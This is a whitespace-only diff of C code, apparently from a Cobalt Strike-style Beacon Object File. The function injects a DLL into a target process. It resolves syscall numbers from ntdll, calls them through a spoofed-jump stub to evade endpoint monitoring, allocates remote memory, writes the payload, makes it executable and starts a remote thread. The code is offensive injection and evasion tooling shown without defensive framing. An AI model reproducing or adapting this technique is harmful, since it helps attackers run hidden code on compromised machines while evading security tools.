@@ -199,12 +199,12 @@ void go(char * args, int alen, BOOL x86) {
    
     // allocate memory
     LPVOID pAddress = NULL;
-	SIZE_T code_len = dllLen;
+    SIZE_T code_len = dllLen;
     GetSyscallId(hNtdll, &SyscallId, (PCHAR)"ZwAllocateVirtualMemory"); 
     setup(SyscallId, spoofJump);
     NTSTATUS status = executioner(hProcess, &pAddress, NULL, &code_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
 
-	// write code
+    // write code
     GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtWriteVirtualMemory"); 
     setup(SyscallId, spoofJump);
     status = executioner(hProcess, pAddress, dllPtr, code_len, NULL); 
@@ -215,14 +215,14 @@ void go(char * args, int alen, BOOL x86) {
     setup(SyscallId, spoofJump);
     status = executioner(hProcess ,&pAddress, &code_len, PAGE_EXECUTE_READ, &oldProt);
 	
-	// start thread
-	HANDLE hThread = NULL;
-	GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtCreateThreadEx");
+    // start thread
+    HANDLE hThread = NULL;
+    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtCreateThreadEx");
     setup(SyscallId, spoofJump);
     status = executioner(&hThread, 0x1FFFFF, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
 	
-	// close handle
-	GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtClose");
+    // close handle
+    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtClose");
     setup(SyscallId, spoofJump);
     status = executioner(hProcess);
    
